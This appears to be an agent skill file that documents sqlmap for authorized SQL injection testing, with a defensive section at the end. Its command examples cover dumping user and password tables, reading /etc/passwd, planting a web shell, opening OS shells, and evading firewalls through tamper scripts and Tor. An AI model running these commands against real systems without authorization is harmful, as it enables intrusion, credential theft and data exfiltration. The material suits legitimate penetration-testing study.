---
name: webapp-sqlmap
description: >
  Automated SQL injection detection and exploitation tool for web application security testing.
  Use when: (1) Testing web applications for SQL injection vulnerabilities in authorized assessments,
  (2) Exploiting SQL injection flaws to demonstrate impact, (3) Extracting database information for
  security validation, (4) Bypassing authentication mechanisms through SQL injection, (5) Identifying
  vulnerable parameters in web requests, (6) Automating database enumeration and data extraction.
version: 0.1.0
maintainer: sirappsec@gmail.com
category: offsec
tags: [sqli, sql-injection, webapp, database-security, exploitation, sqlmap]
frameworks: [OWASP, CWE, MITRE-ATT&CK]
dependencies:
  packages: [sqlmap, python3]
references:
  - https://sqlmap.org/
  - https://owasp.org/www-community/attacks/SQL_Injection
  - https://cwe.mitre.org/data/definitions/89.html
---

# SQLMap - Automated SQL Injection Tool

## Overview

SQLMap is an open-source penetration testing tool that automates the detection and exploitation of SQL injection vulnerabilities. This skill covers authorized security testing including vulnerability detection, database enumeration, data extraction, and authentication bypass.

**IMPORTANT**: SQL injection exploitation is invasive and can corrupt data. Only use SQLMap with proper written authorization on systems you own or have explicit permission to test.

## Quick Start

Basic SQL injection detection:

```bash
# Test single parameter
sqlmap -u "http://example.com/page?id=1"

# Test with POST data
sqlmap -u "http://example.com/login" --data="username=admin&password=test"

# Test from saved request file
sqlmap -r request.txt

# Detect and enumerate databases
sqlmap -u "http://example.com/page?id=1" --dbs
```

## Core Workflow

### SQL Injection Testing Workflow

Progress:
[ ] 1. Verify authorization for web application testing
[ ] 2. Identify potential injection points
[ ] 3. Detect SQL injection vulnerabilities
[ ] 4. Determine DBMS type and version
[ ] 5. Enumerate databases and tables
[ ] 6. Extract sensitive data (if authorized)
[ ] 7. Document findings with remediation guidance
[ ] 8. Clean up any test artifacts

Work through each step systematically. Check off completed items.

### 1. Authorization Verification

**CRITICAL**: Before any SQL injection testing:
- Confirm written authorization from application owner
- Verify scope includes web application security testing
- Understand data protection and handling requirements
- Document allowed testing windows
- Confirm backup and rollback procedures

### 2. Target Identification

Identify potential SQL injection points:

**GET Parameters**:
```bash
# Single URL with parameter
sqlmap -u "http://example.com/product?id=1"

# Multiple parameters
sqlmap -u "http://example.com/search?query=test&category=all&sort=name"

# Test all parameters
sqlmap -u "http://example.com/page?id=1&name=test" --level=5 --risk=3
```

**POST Requests**:
```bash
# POST data directly
sqlmap -u "http://example.com/login" --data="user=admin&pass=test"

# From Burp Suite request file
sqlmap -r login_request.txt

# With additional headers
sqlmap -u "http://example.com/api" --data='{"user":"admin"}' --headers="Content-Type: application/json"
```

**Cookies and Headers**:
```bash
# Test cookies
sqlmap -u "http://example.com/" --cookie="sessionid=abc123; role=user"

# Test custom headers
sqlmap -u "http://example.com/" --headers="X-Forwarded-For: 1.1.1.1\nUser-Agent: Test"

# Test specific injection point
sqlmap -u "http://example.com/" --cookie="sessionid=abc123*; role=user"
```

### 3. Detection and Fingerprinting

Detect SQL injection vulnerabilities:

```bash
# Basic detection
sqlmap -u "http://example.com/page?id=1"

# Aggressive testing (higher risk)
sqlmap -u "http://example.com/page?id=1" --level=5 --risk=3

# Specify technique
sqlmap -u "http://example.com/page?id=1" --technique=BEUSTQ

# Detect DBMS
sqlmap -u "http://example.com/page?id=1" --fingerprint

# Force specific DBMS
sqlmap -u "http://example.com/page?id=1" --dbms=mysql
```

**Injection Techniques**:
- **B**: Boolean-based blind
- **E**: Error-based
- **U**: UNION query-based
- **S**: Stacked queries
- **T**: Time-based blind
- **Q**: Inline queries

### 4. Database Enumeration

Enumerate database structure:

```bash
# List databases
sqlmap -u "http://example.com/page?id=1" --dbs

# Current database
sqlmap -u "http://example.com/page?id=1" --current-db

# List tables in database
sqlmap -u "http://example.com/page?id=1" -D database_name --tables

# List columns in table
sqlmap -u "http://example.com/page?id=1" -D database_name -T users --columns

# Database users
sqlmap -u "http://example.com/page?id=1" --users

# Database user privileges
sqlmap -u "http://example.com/page?id=1" --privileges
```

### 5. Data Extraction

Extract data from database (authorized only):

```bash
# Dump specific table
sqlmap -u "http://example.com/page?id=1" -D database_name -T users --dump

# Dump specific columns
sqlmap -u "http://example.com/page?id=1" -D database_name -T users -C username,password --dump

# Dump all databases (use with caution)
sqlmap -u "http://example.com/page?id=1" --dump-all

# Exclude system databases
sqlmap -u "http://example.com/page?id=1" --dump-all --exclude-sysdbs

# Search for specific data
sqlmap -u "http://example.com/page?id=1" -D database_name --search -C password
```

### 6. Advanced Exploitation

Advanced SQL injection techniques:

**File System Access**:
```bash
# Read file from server
sqlmap -u "http://example.com/page?id=1" --file-read="/etc/passwd"

# Write file to server (very invasive)
sqlmap -u "http://example.com/page?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
```

**OS Command Execution** (requires stacked queries or out-of-band):
```bash
# Execute OS command
sqlmap -u "http://example.com/page?id=1" --os-cmd="whoami"

# Get OS shell
sqlmap -u "http://example.com/page?id=1" --os-shell

# Get SQL shell
sqlmap -u "http://example.com/page?id=1" --sql-shell
```

**Authentication Bypass**:
```bash
# Attempt to bypass login
sqlmap -u "http://example.com/login" --data="user=admin&pass=test" --auth-type=Basic

# Test with authentication
sqlmap -u "http://example.com/page?id=1" --auth-cred="admin:password"
```

### 7. WAF Bypass and Evasion

Evade web application firewalls:

```bash
# Use tamper scripts
sqlmap -u "http://example.com/page?id=1" --tamper=space2comment

# Multiple tamper scripts
sqlmap -u "http://example.com/page?id=1" --tamper=space2comment,between

# Random User-Agent
sqlmap -u "http://example.com/page?id=1" --random-agent

# Custom User-Agent
sqlmap -u "http://example.com/page?id=1" --user-agent="Mozilla/5.0..."

# Add delay between requests
sqlmap -u "http://example.com/page?id=1" --delay=2

# Use proxy
sqlmap -u "http://example.com/page?id=1" --proxy="http://127.0.0.1:8080"

# Use Tor
sqlmap -u "http://example.com/page?id=1" --tor --check-tor
```

**Common Tamper Scripts**:
- `space2comment`: Replace space with comments
- `between`: Replace equals with BETWEEN
- `charencode`: URL encode characters
- `randomcase`: Random case for keywords
- `apostrophemask`: Replace apostrophe with UTF-8
- `equaltolike`: Replace equals with LIKE

## Security Considerations

### Authorization & Legal Compliance

- **Written Permission**: Obtain explicit authorization for SQL injection testing
- **Data Protection**: Handle extracted data per engagement rules
- **Scope Boundaries**: Only test explicitly authorized applications
- **Backup Verification**: Ensure backups exist before invasive testing
- **Production Systems**: Extra caution on production databases

### Operational Security

- **Rate Limiting**: Use --delay to avoid overwhelming applications
- **Session Management**: Save and resume sessions with --flush-session
- **Logging**: All SQLMap activity is logged to ~/.sqlmap/output/
- **Data Sanitization**: Redact sensitive data from reports
- **False Positives**: Verify findings manually

### Audit Logging

Document all SQL injection testing:
- Target URLs and parameters tested
- Injection techniques successful
- Databases and tables accessed
- Data extracted (summary only, not full data)
- Commands executed
- Tamper scripts and evasion used

### Compliance

- **OWASP Top 10**: A03:2021 - Injection
- **CWE-89**: SQL Injection
- **MITRE ATT&CK**: T1190 (Exploit Public-Facing Application)
- **PCI-DSS**: 6.5.1 - Injection flaws
- **ISO 27001**: A.14.2 Security in development

## Common Patterns

### Pattern 1: Basic Vulnerability Assessment

```bash
# Detect vulnerability
sqlmap -u "http://example.com/page?id=1" --batch

# Enumerate databases
sqlmap -u "http://example.com/page?id=1" --dbs --batch

# Get current user and privileges
sqlmap -u "http://example.com/page?id=1" --current-user --current-db --is-dba --batch
```

### Pattern 2: Authentication Bypass Testing

```bash
# Test login form
sqlmap -u "http://example.com/login" \
  --data="username=admin&password=test" \
  --level=5 --risk=3 \
  --technique=BE \
  --batch

# Attempt to extract admin credentials
sqlmap -u "http://example.com/login" \
  --data="username=admin&password=test" \
  -D app_db -T users -C username,password --dump \
  --batch
```

### Pattern 3: API Testing

```bash
# JSON API endpoint
sqlmap -u "http://api.example.com/user/1" \
  --headers="Content-Type: application/json\nAuthorization: Bearer token123" \
  --level=3 \
  --batch

# REST API with POST
sqlmap -u "http://api.example.com/search" \
  --data='{"query":"test","limit":10}' \
  --headers="Content-Type: application/json" \
  --batch
```

### Pattern 4: Comprehensive Enumeration

```bash
# Full enumeration (use with extreme caution)
sqlmap -u "http://example.com/page?id=1" \
  --banner \
  --current-user \
  --current-db \
  --is-dba \
  --users \
  --passwords \
  --privileges \
  --dbs \
  --batch
```

## Integration Points

### Burp Suite Integration

```bash
# Save request from Burp Suite as request.txt
# Right-click request → "Copy to file"

# Test with SQLMap
sqlmap -r request.txt --batch

# Use Burp as proxy
sqlmap -u "http://example.com/page?id=1" --proxy="http://127.0.0.1:8080"
```

### Reporting and Output

```bash
# Save session for later
sqlmap -u "http://example.com/page?id=1" -s output.sqlite

# Resume session
sqlmap -u "http://example.com/page?id=1" --resume

# Custom output directory
sqlmap -u "http://example.com/page?id=1" --output-dir="/path/to/results"

# Verbose output
sqlmap -u "http://example.com/page?id=1" -v 3

# Traffic log
sqlmap -u "http://example.com/page?id=1" -t traffic.log
```

## Troubleshooting

### Issue: False Positives

**Solutions**:
```bash
# Increase detection accuracy
sqlmap -u "http://example.com/page?id=1" --string="Welcome" --not-string="Error"

# Use specific technique
sqlmap -u "http://example.com/page?id=1" --technique=U

# Manual verification
sqlmap -u "http://example.com/page?id=1" --sql-query="SELECT version()"
```

### Issue: WAF Blocking Requests

**Solutions**:
```bash
# Use tamper scripts
sqlmap -u "http://example.com/page?id=1" --tamper=space2comment,between --random-agent

# Add delays
sqlmap -u "http://example.com/page?id=1" --delay=3 --randomize

# Change HTTP method
sqlmap -u "http://example.com/page?id=1" --method=PUT
```

### Issue: Slow Performance

**Solutions**:
```bash
# Use threads (careful with application stability)
sqlmap -u "http://example.com/page?id=1" --threads=5

# Reduce testing scope
sqlmap -u "http://example.com/page?id=1" --level=1 --risk=1

# Test specific parameter only
sqlmap -u "http://example.com/page?id=1&name=test" -p id
```

## Defensive Considerations

Protect applications against SQL injection:

**Secure Coding Practices**:
- Use parameterized queries/prepared statements
- Employ ORM frameworks properly
- Validate and sanitize all user input
- Apply principle of least privilege to database accounts
- Disable error messages in production

**Web Application Firewall Rules**:
- Block common SQL injection patterns
- Implement rate limiting
- Monitor for suspicious query patterns
- Alert on multiple injection attempts

**Detection and Monitoring**:
- Log all database queries
- Monitor for unusual query patterns
- Alert on error-based injection attempts
- Detect time-based blind injection delays
- Monitor for UNION-based queries

## References

- [SQLMap Official Documentation](https://sqlmap.org/)
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
- [SQLMap Tamper Scripts](https://github.com/sqlmapproject/sqlmap/tree/master/tamper)
- [PTES: Vulnerability Analysis](http://www.pentest-standard.org/index.php/Vulnerability_Analysis)
